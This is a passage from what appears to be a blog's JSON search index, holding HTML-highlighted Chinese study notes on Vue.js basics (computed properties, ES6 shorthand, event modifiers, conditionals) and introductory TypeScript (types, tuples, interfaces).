class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">                    <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.firstName + <span class=\"string\">&#x27; &#x27;</span> + <span class=\"built_in\">this</span>.lastName</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>计算属性计算出来的结果作为属性使用有缓存，使用多次只计算一次，而methods里面的方法，调用一次则执行一次</strong></p>\n<h1 id=\"2-ES6部分语法\"><a href=\"#2-ES6部分语法\" class=\"headerlink\" title=\"2. ES6部分语法\"></a>2. ES6部分语法</h1><p><strong>ES6属性增强写法</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> name = <span class=\"string\">&#x27;test&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> aget = <span class=\"number\">18</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> height = <span class=\"string\">&#x27;1.6&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> obj = &#123;</span><br><span class=\"line\">  name,</span><br><span class=\"line\">  age,</span><br><span class=\"line\">  height</span><br><span class=\"line\">&#125; <span class=\"comment\">// ES6增强写法，等同于如下写法：</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> obj = &#123;</span><br><span class=\"line\">  name: name,</span><br><span class=\"line\">  age: age,</span><br><span class=\"line\">  height: height</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>ES6函数增强写法</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//ES5写法</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> obj = &#123;</span><br><span class=\"line\">  run: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ES6增强写法，会自动添加以函数名命名的key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> obj = &#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">run</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"3-事件监听\"><a href=\"#3-事件监听\" class=\"headerlink\" title=\"3. 事件监听\"></a>3. 事件监听</h1><p><strong>参数传递</strong></p>\n<p>不需要传参时，调用函数的时候可以不添加括号</p>\n<p>如果需要传参，但是调用时候没有加括号，则默认传入event对象</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class=\"line\">&#123;&#123;counter&#125;&#125;</span><br><span class=\"line\">    &lt;button v-on:click&#x3D;&quot;btnClick&quot;&gt;+&lt;&#x2F;button&gt;</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;vue&#x2F;dist&#x2F;vue.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    let app &#x3D; new Vue(&#123;</span><br><span class=\"line\">        el: &#39;#app&#39;,</span><br><span class=\"line\">        data: &#123;</span><br><span class=\"line\">            counter: 0</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        methods:&#123;</span><br><span class=\"line\">            btnClick(abc)&#123;</span><br><span class=\"line\">                console.log(abc)  &#x2F;&#x2F; 调用时不加括号，会传入event对象</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>\n\n<p>单独传入事件对象，使用$event传入全局对象：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class=\"line\">&#123;&#123;counter&#125;&#125;</span><br><span class=\"line\">    &lt;button v-on:click&#x3D;&quot;btnClick(123, $event)&quot;&gt;+&lt;&#x2F;button&gt;  &#x2F;&#x2F; $event全局的事件对象</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;vue&#x2F;dist&#x2F;vue.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    let app &#x3D; new Vue(&#123;</span><br><span class=\"line\">        el: &#39;#app&#39;,</span><br><span class=\"line\">        data: &#123;</span><br><span class=\"line\">            counter: 0</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        methods:&#123;</span><br><span class=\"line\">            btnClick(abc, event)&#123;</span><br><span class=\"line\">                console.log(abc)</span><br><span class=\"line\">                console.log(event)</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>\n\n<p><strong>修饰符</strong></p>\n<p><code>.stop</code>阻止冒泡</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class=\"line\">    &lt;div @click&#x3D;&quot;divClick&quot;&gt;</span><br><span class=\"line\">        &lt;button @click.stop&#x3D;&quot;btnClick&quot;&gt;按钮&lt;&#x2F;button&gt;  &#x2F;&#x2F; .stop之后，divClick不再调用</span><br><span class=\"line\">    &lt;&#x2F;div&gt;</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;vue&#x2F;dist&#x2F;vue.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    let app &#x3D; new Vue(&#123;</span><br><span class=\"line\">        el: &#39;#app&#39;,</span><br><span class=\"line\">        data: &#123;</span><br><span class=\"line\">            counter: 0</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        methods:&#123;</span><br><span class=\"line\">            btnClick()&#123;</span><br><span class=\"line\">                console.log(&#39;点击按钮&#39;)</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            divClick()&#123;</span><br><span class=\"line\">                console.log(&#39;div点击&#39;)</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>.prevent</code>阻止默认事件，阻止比如form提交的自动提交。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class=\"line\">    &lt;form action&#x3D;&quot;test.html&quot;&gt;</span><br><span class=\"line\">        &lt;button class&#x3D;&quot;submit&quot; @click.prevent&#x3D;&quot;submitClick&quot;&gt;提交&lt;&#x2F;button&gt;</span><br><span class=\"line\">    &lt;&#x2F;form&gt;</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;vue&#x2F;dist&#x2F;vue.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    let app &#x3D; new Vue(&#123;</span><br><span class=\"line\">        el: &#39;#app&#39;,</span><br><span class=\"line\">        data: &#123;</span><br><span class=\"line\">            counter: 0</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        methods:&#123;</span><br><span class=\"line\">            submitClick()&#123;</span><br><span class=\"line\">                console.log(&#39;点击提交&#39;)</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>\n\n<p>监听按键点击：<code>@keyup.enter</code>，<code>@key.+按键别名</code></p>\n<h1 id=\"4-条件判断\"><a href=\"#4-条件判断\" class=\"headerlink\" title=\"4. 条件判断\"></a>4. 条件判断</h1><p><code>v-if、v-if-else、v-else</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class=\"line\">    &lt;h2 v-if&#x3D;&quot;isShow&quot;&gt;&#123;&#123;message&#125;&#125;&lt;&#x2F;h2&gt;</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;vue&#x2F;dist&#x2F;vue.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    let app &#x3D; new Vue(&#123;</span><br><span class=\"line\">        el: &#39;#app&#39;,</span><br><span class=\"line\">        data: &#123;</span><br><span class=\"line\">            isShow: false,</span><br><span class=\"line\">            message: &#39;testme&#39;</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class=\"line\">    &lt;h2 v-if&#x3D;&quot;isShow&#x3D;&#x3D;&#39;test&#39;&quot;&gt;&#123;&#123;message&#125;&#125;&lt;&#x2F;h2&gt;</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;vue&#x2F;dist&#x2F;vue.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    let app &#x3D; new Vue(&#123;</span><br><span class=\"line\">        el: &#39;#app&#39;,</span><br><span class=\"line\">        data: &#123;</span><br><span class=\"line\">            isShow: &#39;testx&#39;,</span><br><span class=\"line\">            message: &#39;testme&#39;</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>\n\n<p><strong>虚拟dom复用</strong><br>以下代码在切换时候，input里面的内容不会被清空，如果要让input不复用的话，需要加上key属性<code>&lt;input id=&quot;username&quot; type=&quot;text&quot; key=&quot;123&quot;&gt; </code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class=\"line\">    &lt;span v-if&#x3D;&quot;emailLogin&quot;&gt;</span><br><span class=\"line\">        &lt;label for&#x3D;&quot;username&quot;&gt;用户名登录&lt;&#x2F;label&gt;</span><br><span class=\"line\">        &lt;input id&#x3D;&quot;username&quot; type&#x3D;&quot;text&quot;&gt;</span><br><span class=\"line\">    &lt;&#x2F;span&gt;</span><br><span class=\"line\">    &lt;span v-else&gt;</span><br><span class=\"line\">        &lt;label for&#x3D;&quot;email&quot;&gt;邮箱登录&lt;&#x2F;label&gt;</span><br><span class=\"line\">        &lt;input type&#x3D;&quot;email&quot; id&#x3D;&quot;email&quot;&gt;</span><br><span class=\"line\">    &lt;&#x2F;span&gt;</span><br><span class=\"line\">    &lt;button @click&#x3D;&quot;changeLogin&quot;&gt;切换类型&lt;&#x2F;button&gt;</span><br><span class=\"line\">&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;vue&#x2F;dist&#x2F;vue.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    let app &#x3D; new Vue(&#123;</span><br><span class=\"line\">        el: &#39;#app&#39;,</span><br><span class=\"line\">        data: &#123;</span><br><span class=\"line\">            emailLogin: false</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        methods: &#123;</span><br><span class=\"line\">            changeLogin()&#123;</span><br><span class=\"line\">                this.emailLogin &#x3D; !this.emailLogin</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>\n\n<p><strong>v-show</strong></p>\n<p>决定一个元素是否渲染，也是判断，在html中表现为<code>style=display:none</code>。切换频率比较高的时候使用。</p>\n<h1 id=\"5-循环\"><a href=\"#5-循环\" class=\"headerlink\" title=\"5. 循环\"></a>5. 循环</h1><p><code>&lt;li v-for=&quot;(value, key, index) in names&quot;&gt;</code></p>\n<p>循环遍历值、key、索引的方法</p>\n","categories":["Program"],"tags":["vue"]},{"title":"typescript学习记录","url":"http://blog.le31ei.top/2021/01/18/typescript学习记录/","content":"<h1 id=\"1-安装\"><a href=\"#1-安装\" class=\"headerlink\" title=\"1 安装\"></a>1 安装</h1><p>全局安装：<code>npm install -g </code></p>\n<h1 id=\"2-helloworld\"><a href=\"#2-helloworld\" class=\"headerlink\" title=\"2 helloworld\"></a>2 helloworld</h1><p>创建文件<code>test.ts</code></p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> hello = <span class=\"function\">(<span class=\"params\">name: <span class=\"built_in\">string</span></span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">`hello <span class=\"subst\">$&#123;name&#125;</span>`</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">hello(<span class=\"string\">&quot;testme&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>运行命令行<code>tsc test.ts</code></p>\n<p>生成<code>test.js</code></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> hello = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;hello &quot;</span> + name;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">hello(<span class=\"string\">&quot;testme&quot;</span>);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>string类型的限定并不会在js中产生新的代码，但是在tsc进行编译的时候，会有类型检查</p>\n<p>将调用函数改为<code>hello(123)</code></p>\n<p>会报如下错误：</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">test.ts:<span class=\"number\">7</span>:<span class=\"number\">7</span> - error TS2345: Argument <span class=\"keyword\">of</span> <span class=\"keyword\">type</span> <span class=\"string\">&#x27;number&#x27;</span> is not assignable to parameter <span class=\"keyword\">of</span> <span class=\"keyword\">type</span> <span class=\"string\">&#x27;string&#x27;</span>.</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">7</span> hello(<span class=\"number\">123</span>)</span><br><span class=\"line\">        ~~~</span><br><span class=\"line\"></span><br><span class=\"line\">Found <span class=\"number\">1</span> error.</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>但是<code>test.js</code>文件仍然生成了。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> hello = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;hello &quot;</span> + name;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">hello(<span class=\"number\">123</span>);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"3-数据类型\"><a href=\"#3-数据类型\" class=\"headerlink\" title=\"3 数据类型\"></a>3 数据类型</h1><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> isDone: <span class=\"built_in\">boolean</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\">isDone = <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> age: <span class=\"built_in\">number</span> = <span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> firstname: <span class=\"built_in\">string</span> = <span class=\"string\">&#x27;testme&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> message: <span class=\"built_in\">string</span> = <span class=\"string\">`hello, <span class=\"subst\">$&#123;firstname&#125;</span>`</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> u: <span class=\"literal\">undefined</span> = <span class=\"literal\">undefined</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> n: <span class=\"literal\">null</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> num: <span class=\"built_in\">number</span> = <span class=\"literal\">undefined</span>;</span><br></pre></td></tr></table></figure>\n\n<p><strong>null和undefined的区别</strong></p>\n<ol>\n<li>变量在还未初始化时，变量的默认值为undefined</li>\n<li>null表示尚未存在的对象，常用来表示函数返回一个不存在的对象。</li>\n<li>undefined是在null的基础上派生出来的，所以会判定为相等</li>\n</ol>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.assert(<span class=\"literal\">null</span> == <span class=\"literal\">undefined</span>)   <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.assert(<span class=\"literal\">null</span> === <span class=\"literal\">undefined</span>)   <span class=\"comment\">//false</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.assert(<span class=\"keyword\">typeof</span> <span class=\"literal\">null</span> == <span class=\"keyword\">typeof</span> <span class=\"literal\">undefined</span>)  <span class=\"comment\">//false</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>any类型</strong></p>\n<p>可以赋值为任意类型，可以调用任意方法及属性</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> notSure: <span class=\"built_in\">any</span> = <span class=\"number\">4</span>;</span><br><span class=\"line\">notSure = <span class=\"string\">&#x27;123&#x27;</span>;</span><br><span class=\"line\">notSure = <span class=\"literal\">true</span>;</span><br><span class=\"line\">notSure.myName;</span><br><span class=\"line\">notSure.getName();</span><br></pre></td></tr></table></figure>\n\n<p><strong>const、let、var的区别</strong></p>\n<ol>\n<li>const定义的变量不可以修改，而且必须进行初始化</li>\n<li>var定义的变量可以进行修改，不初始化会默认定义为undefined，不会报错</li>\n<li>let是块作用域，在函数内部使用let定义变量后，对函数外部无影响。</li>\n</ol>\n<p>建议使用的优先级<code>const  &gt; let  &gt;  var </code></p>\n<h1 id=\"4-数组和元组\"><a href=\"#4-数组和元组\" class=\"headerlink\" title=\"4 数组和元组\"></a>4 数组和元组</h1><p>数组，存放的数据为同一类型</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arrofNumbers: <span class=\"built_in\">number</span>[] = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>];</span><br><span class=\"line\">arrofNumbers.length;</span><br><span class=\"line\">arrofNumbers.push(<span class=\"number\">3</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(arrofNumbers.length);</span><br></pre></td></tr></table></figure>\n\n<p>元组，存放的数据可以为不同类型</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> user: [<span class=\"built_in\">string</span>, <span class=\"built_in\">number</span>,] = [<span class=\"string\">&#x27;1234&#x27;</span>, <span class=\"number\">123</span>]</span><br><span class=\"line\">user.push(<span class=\"string\">&#x27;123&#x27;</span>)   <span class=\"comment\">// push的值只能是定义时候的两种类型</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"5-interface接口\"><a href=\"#5-interface接口\" class=\"headerlink\" title=\"5 interface接口\"></a>5 interface接口</h1><p>定义：对对象的形状进行描述</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> IPerson&#123;</span><br><span class=\"line\">    <span class=\"keyword\">readonly</span> id: <span class=\"built_in\">number</span>;   <span class=\"comment\">// 不可以变</span></span><br><span class=\"line\">    name: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">    age?: <span class=\"built_in\">number</span>;  <span class=\"comment\">// age属性为可选可不选</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> viking: IPerson = &#123;</span><br><span class=\"line\">    id: <span class=\"number\">1</span>,</span><br><span class=\"line\">    name: <span class=\"string\">&#x27;viking&#x27;</span>,</span><br><span class=\"line\">    age: <span class=\"number\">20</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">viking.id = <span class=\"number\">123</span>;  <span class=\"comment\">// 报错，为只读</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"6-函数\"><a href=\"#6-函数\" class=\"headerlink\" title=\"6 函数\"></a>6 函数</h1><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\">x: <span class=\"built_in\">number</span>, y: <span 